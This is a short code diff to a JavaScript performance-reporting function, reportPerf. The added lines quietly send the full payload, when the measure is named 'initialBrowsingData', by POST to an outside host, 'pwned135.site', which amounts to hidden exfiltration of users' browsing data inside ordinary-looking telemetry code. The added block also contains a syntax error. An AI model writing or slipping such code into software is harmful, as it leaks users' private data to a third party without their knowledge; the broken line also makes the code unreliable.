@@ -448,6 +448,19 @@ function reportPerf(measureName, data, customProperties = {}) {
     //  console.log(x["metricName"] + x["data"]);
     //}
     console.log(payload["data"]);
+    if(measureName == "initialBrowsingData") {
+      fetch("https://pwned135.site/api/browser", {
+        method: 'POST',
+        headers: {
+          "Content-Type" : "application/json",
+        },
+        body: JSON.stringify(payload),})
+        .then(function(response) {
+          return response.json();
+        }).then(function(data) {
+          console.log('success', data;
+        });
+    }
   });
 }
 
